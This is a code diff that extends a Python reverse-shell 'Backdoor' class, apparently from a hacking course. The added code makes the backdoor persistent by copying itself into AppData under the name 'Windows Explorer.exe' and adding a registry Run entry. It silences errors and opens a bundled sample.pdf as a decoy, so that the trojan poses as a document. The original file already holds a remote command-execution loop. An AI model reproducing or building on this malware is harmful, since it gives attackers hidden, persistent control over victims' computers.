@@ -3,6 +3,8 @@ import socket
 import subprocess
 import json
 import os
+import sys
+import shutil
 import base64
 
 
@@ -10,9 +12,20 @@ import base64
 class Backdoor:
     # Constructor
     def __init__(self, ip, port):
+        self.become_persistent()
         # Creating a Socket
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
+
+    @staticmethod
+    # Making Persistent
+    def become_persistent(self):
+        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
+        if not os.path.exists(evil_file_location):
+            shutil.copyfile(sys.executable, evil_file_location)
+            subprocess.call(
+                'HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t REG_SZ /d "' + evil_file_location
+                + '"', shell=True)
 
     # Reliable Data Sending
     def reliable_send(self, data):
@@ -32,7 +45,8 @@ class Backdoor:
     # Execute System Commands
     @staticmethod
     def execute_system_command(self, command):
-        return subprocess.check_output(command, shell=True)
+        DEVNULL = open(os.devnull, "wb")
+        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
 
     # Changing Current Working Directory
     @staticmethod
@@ -61,7 +75,7 @@ class Backdoor:
                 command = self.reliable_receive()
                 if command[0] == 'exit':
                     self.connection.close()
-                    exit()
+                    sys.exit()
 
                 elif command[0] == 'cd' and len(command) > 1:
                     command_result = self.change_working_directory_to(command[1])
@@ -85,6 +99,15 @@ class Backdoor:
             self.reliable_send(command_result)
 
 
+# Changing the executable location
+file_name = sys._MEIPASS + '\sample.pdf'
+subprocess.Popen(file_name)
+
+
 # Run Backdoor
-backdoor = Backdoor("127.0.0.1", 4444)
-backdoor.run()
+try:
+    backdoor = Backdoor("127.0.0.1", 4444)
+    backdoor.run()
+
+except Exception:
+    sys.exit()
